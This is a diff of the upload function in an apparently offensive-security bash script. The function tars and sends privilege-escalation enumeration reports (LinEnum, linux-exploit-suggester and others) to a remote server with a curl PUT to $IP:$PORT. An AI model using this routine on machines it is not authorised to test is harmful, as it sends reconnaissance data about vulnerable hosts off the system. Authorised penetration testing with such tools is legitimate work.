@@ -297,39 +297,28 @@ function runtools () {
 
 # Upload reports
 function upload () {
-	# Check for curl
-	# zip up linenum-report before transferring
-	# check that each file exists before uploading
-	# 1. lse-report.txt
-	# 2. linenum-report (zip this!) 
-	# 3. linuxprivchecker-report.txt
-	# 4. uptux-report.txt
-	# 5. suid3num-report.txt
-	# 6. les-report.txt
-	# 7. les-soft-report.txt
 
 	REPORTS=( "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" )
-
 
 	CURL=$(command -v curl);
 	if [[ "$CURL" == ""  ]]; then
 			echo -e "${ORANGE}[!] curl not found, skipping report upload!${NC}";
+			return;
 	else
 			echo -e "${BLUE}[*] Beginning report upload!${NC}";
 
-			# tar up linenum-report
+			# Tar up linenum-report
 			if [[ -e "$DIR"/linenum-report ]]; then
 					echo -e "${GREEN}[i] Tar-ing up linenum-report.${NC}";
 					tar czf "$DIR"/linenum-report.tar.gz "$DIR"/linenum-report;
 			fi
 			
-			# upload each report
+			# Upload each report
 			for report in "${REPORTS[@]}"
 			do
 					if [[ -e "$DIR/$report" ]]; then
 							echo -e "${GREEN}[i] Uploading $report to the host server..${NC}";
 							curl -X PUT --upload-file "$DIR/$report" http://"$IP":"$PORT";
-							echo "The report to upload is $report.";
 					fi
 			done
 	fi
